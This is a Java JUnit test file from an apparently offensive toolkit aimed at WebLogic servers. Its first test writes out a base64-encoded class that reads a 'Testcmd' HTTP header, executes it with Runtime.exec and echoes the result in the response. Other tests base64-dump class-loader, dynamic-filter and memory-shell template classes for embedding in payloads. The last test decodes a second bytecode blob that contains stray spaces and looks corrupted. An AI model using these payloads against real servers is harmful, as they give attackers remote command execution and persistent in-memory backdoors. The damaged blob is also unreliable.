import com.feihong.payload.FileWritePayload;
import com.feihong.template.DynamicFilterTemplate;
import com.feihong.template.MyClassLoader;
import com.feihong.template.WeblogicMemshellTemplate;
import com.feihong.utils.ClassFiles;
import org.apache.shiro.codec.Base64;

import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;

public class Test {

    @org.junit.Test
    public void test() throws IOException {
        String classCode = "yv66vgAAADIAjwEADFdlYmxvZ2ljRWNobwcAAQEAEGphdmEvbGFuZy9PYmplY3QHAAMBAApTb3VyY2VGaWxlAQARV2VibG9naWNFY2hvLmphdmEBAAY8aW5pdD4BAAMoKVYMAAcACAoABAAJAQAQamF2YS9sYW5nL1RocmVhZAcACwEADWN1cnJlbnRUaHJlYWQBABQoKUxqYXZhL2xhbmcvVGhyZWFkOwwADQAOCgAMAA8BABt3ZWJsb2dpYy93b3JrL0V4ZWN1dGVUaHJlYWQHABEBAA5nZXRDdXJyZW50V29yawEAHSgpTHdlYmxvZ2ljL3dvcmsvV29ya0FkYXB0ZXI7DAATABQKABIAFQEACGdldENsYXNzAQATKClMamF2YS9sYW5nL0NsYXNzOwwAFwAYCgAEABkBABFjb25uZWN0aW9uSGFuZGxlcggAGwEAD2phdmEvbGFuZy9DbGFzcwcAHQEAEGdldERlY2xhcmVkRmllbGQBAC0oTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvcmVmbGVjdC9GaWVsZDsMAB8AIAoAHgAhAQAiamF2YS9sYW5nL3JlZmxlY3QvQWNjZXNzaWJsZU9iamVjdAcAIwEADXNldEFjY2Vzc2libGUBAAQoWilWDAAlACYKACQAJwEAF2phdmEvbGFuZy9yZWZsZWN0L0ZpZWxkBwApAQADZ2V0AQAmKExqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsMACsALAoAKgAtAQARZ2V0U2VydmxldFJlcXVlc3QIAC8BAAlnZXRNZXRob2QBAEAoTGphdmEvbGFuZy9TdHJpbmc7W0xqYXZhL2xhbmcvQ2xhc3M7KUxqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2Q7DAAxADIKAB4AMwEAGGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZAcANQEABmludm9rZQEAOShMamF2YS9sYW5nL09iamVjdDtbTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwwANwA4CgA2ADkBAAtnZXRSZXNwb25zZQgAOwEALXdlYmxvZ2ljL3NlcnZsZXQvaW50ZXJuYWwvU2VydmxldFJlc3BvbnNlSW1wbAcAPQEACWdldEhlYWRlcggAPwEAEGphdmEvbGFuZy9TdHJpbmcHAEEBAAhUZXN0ZWNobwgAQwEAB2lzRW1wdHkBAAMoKVoMAEUARgoAQgBHAQAJYWRkSGVhZGVyCABJAQAHVGVzdGNtZAgASwEAEWphdmEvdXRpbC9TY2FubmVyBwBNAQARamF2YS9sYW5nL1J1bnRpbWUHAE8BAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7DABRAFIKAFAAUwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsMAFUAVgoAUABXAQARamF2YS9sYW5nL1Byb2Nlc3MHAFkBAA5nZXRJbnB1dFN0cmVhbQEAFygpTGphdmEvaW8vSW5wdXRTdHJlYW07DABbAFwKAFoAXQEAGChMamF2YS9pby9JbnB1dFN0cmVhbTspVgwABwBfCgBOAGABAAJcQQgAYgEADHVzZURlbGltaXRlcgEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvdXRpbC9TY2FubmVyOwwAZABlCgBOAGYBAARuZXh0AQAUKClMamF2YS9sYW5nL1N0cmluZzsMAGgAaQoATgBqAQAWZ2V0U2VydmxldE91dHB1dFN0cmVhbQEANSgpTHdlYmxvZ2ljL3NlcnZsZXQvaW50ZXJuYWwvU2VydmxldE91dHB1dFN0cmVhbUltcGw7DABsAG0KAD4AbgEAI3dlYmxvZ2ljL3htbC91dGlsL1N0cmluZ0lucHV0U3RyZWFtBwBwAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWDAAHAHIKAHEAcwEAMXdlYmxvZ2ljL3NlcnZsZXQvaW50ZXJuYWwvU2VydmxldE91dHB1dFN0cmVhbUltcGwHAHUBAAt3cml0ZVN0cmVhbQwAdwBfCgB2AHgBAAVmbHVzaAwAegAICgB2AHsBAAlnZXRXcml0ZXIBABcoKUxqYXZhL2lvL1ByaW50V3JpdGVyOwwAfQB+CgA+AH8BAAAIAIEBABNqYXZhL2lvL1ByaW50V3JpdGVyBwCDAQAFd3JpdGUMAIUAcgoAhACGAQAEQ29kZQEACkV4Y2VwdGlvbnMBABNqYXZhL2xhbmcvRXhjZXB0aW9uBwCKAQAZd2VibG9naWMvd29yay9Xb3JrQWRhcHRlcgcAjAEADVN0YWNrTWFwVGFibGUAIQACAAQAAAAAAAEAAQAHAAgAAgCIAAABYAAGAAgAAAEpKrcACrgAEMAAErYAFkwrtgAaEhy2ACJNLAS2ACgsK7YALk4ttgAaEjADvQAetgA0LQO9AAS2ADpOLbYAGhI8A70AHrYANC0DvQAEtgA6wAA+OgQttgAaEkAEvQAeWQMSQlO2ADQtBL0ABFkDEkRTtgA6wABCOgUZBQGlAAsZBbYASJkABqcALxkEtgAaEkoFvQAeWQMSQlNZBBJCU7YANBkEBb0ABFkDEkRTWQQZBVO2ADpXLbYAGhJABL0AHlkDEkJTtgA0LQS9AARZAxJMU7YAOsAAQjoGGQYBpQALGQa2AEiZAAanAEK7AE5ZuABUGQa2AFi2AF63AGESY7YAZ7YAazoHGQS2AG+7AHFZGQe3AHS2AHkZBLYAb7YAfBkEtgCAEoK2AIexAAAAAQCOAAAAJQAG/wCFAAYHAAIHAI0HACoHAAQHAD4HAEIAAAIr/AAxBwBCAj4AiQAAAAQAAQCLAAEABQAAAAIABg==";

        FileOutputStream fous = new FileOutputStream("1.class");
        byte[] bytes = Base64.decode(classCode);
        fous.write(bytes);
        fous.close();
    }


    @org.junit.Test
    public void test2() throws IOException{
        byte[] bytes = ClassFiles.classAsBytes(MyClassLoader.class);
        System.out.println(MyClassLoader.class.getName());
        System.out.println(Base64.encodeToString(bytes));
    }

    @org.junit.Test
    public void test3() throws IOException{
        byte[] bytes = ClassFiles.classAsBytes(DynamicFilterTemplate.class);
        System.out.println(DynamicFilterTemplate.class.getName());
        System.out.println(Base64.encodeToString(bytes));
    }

    @org.junit.Test
    public void test4() throws IOException{
        byte[] bytes = ClassFiles.classAsBytes(WeblogicMemshellTemplate.class);
        System.out.println(WeblogicMemshellTemplate.class.getName());
        System.out.println(Base64.encodeToString(bytes));
    }

    @org.junit.Test
    public void test5() throws IOException{
        String code = "yv66vgAAADIA8goAHAB  AD0AAAACAAEAPwBAAAEAQQAAAGIAAgACAAAAGiq3AAEqEgK1AAMqEgS1AAUqK7UABiq3AAexAAAAAgBCAAAAGgAGAAAAFAAEABEACgASABAAFQAVABYAGQAXAEMAAAAWAAIAAAAaAEQARQAAAAAAGgA6ADsAAQACAEYARwABAEEAAAR AAkAEAAAAfMqtAAGtgAIEgm2AApMKwS2AAsrKrQABrYADMAADU0stgAOTi0qtAADtgAPmgG/sgAQEhG2ABK4ABO2ABQ6BBkEEhW2ABY6BacAiToGuwAYWbcAGToHEho6CBkHGQi2ABs6CQE6ChkEtgAIOgsZCscANxkLEhylADAZCxIdBr0AHlkDEh9TWQSyACBTWQWyACBTtgAhOgqn/9Y6DBkLtgAjOgun/8oZCgS2ACQZChkEBr0AHFkDGQlTWQQDuAAlU1kFGQm uAAlU7YAJsAAHjoFLbYACBInEAa9AB5ZAxIoU1kEEihTWQUSKVNZBhIpU1kHEipTWQgSKVO2ACE6BhkGBLYAJBkGLRAGvQAcWQMqtAADU1kEEhVTWQUEvQAoWQMqtAAFU1NZBgFTWQcBU1kIAVO2ACZXLbYACBIrtgAKOgcZBwS2AAsZBy22AAzAACw6CAM2CRUJGQi2AC2iAI4ZCBUJtgAuOgoZCrYACBIvtgAKOgsZCwS2AAsZCxkKtgAMwAAwOgwZDLYACLYAIxIxtgAKOgsZCwS2AAsZCxkMtgAMwAAyOg0ZDSq0AAW2ADM6DhkOxgAwGQ62ADQqtAAFtgA1mQAhGQo6DxkIFQkZCAO2AC62ADZXGQgDGQ 2ADZXpwAJhAkBp/9upwAITCu2ADixAAMAPgBHAEoAFwB4AJYAmQAiAAAB6gHtADcAAwBCAAAAwgAwAAAAGwANABwAEgAdAB4AHgAjACEALgAiADYAJAA ACcARwA4AEoAKABMACkAVQAqAFkAKwBiAC0AZQAuAGwALwB4ADEAlgA0AJkAMgCbADMAogA0AKUANgCrADcA0AA8AP4APQEEAD4BNgBCAUEAQwFHAEQBUgBIAV8ASQFoAEoBdABLAXoATAGGAE4BlQBPAZsAUAGnAFIBsgBTAcYAVAHKAFUB2ABWAeEAVwHkAEgB6gBdAe0AWwHuAFwB8gBeAEMAAAD8ABkARwADAEgASQAFAJsABwBKAEsADABVAHsATABNAAcAWQB3AE4APQAIAGIAbgBPAFAACQBlAGsAUQBSAAoAbABkAFMASQALAEwAhABUAFUABgHKABoAVgBXAA8BaAB8AFgAVwAKAXQAcABZAFoACwGGAF4AWwBcAAwBpwA9AF0AXgANAbIAMgBfAFcADgFVAJUAYABhAAkAPgGsAGIAYwAEANABGgBIAEkABQD AOwAZABSAAYBQQCpAGUAWgAHAVIAmABmAGcACAANAd0AaABaAAEAHgHMAGkAagACACMBxwBrAGwAAwHuAAQAVABtAAEAAAHzAEQARQAAAG4AAACXAAr/AEoABQcAbwcAcAcAcQcAcgcAcwABBwB0/wAhAAwHAG8HAHAHAHEHAHIHAHMABwB0BwB1BwB2BwAfBwB3BwB4AABsBwB5C/8AKgAGBwBvBwBwBwBxBwByBwBzBwB4AAD/AIQACgcAbwcAcAcAcQcAcgcAcwcAeAcAdwcAcAcAegEAAPsAjv8ABQABBwBvAABCBwB7BAACAHwAAAACAH0A6AAAAAoAAQDmACoA5wYJ";
        byte[] bytes = Base64.decode(code);
        FileOutputStream fous = new FileOutputStream("2.class");
        fous.write(bytes);
        fous.close();
    }
}
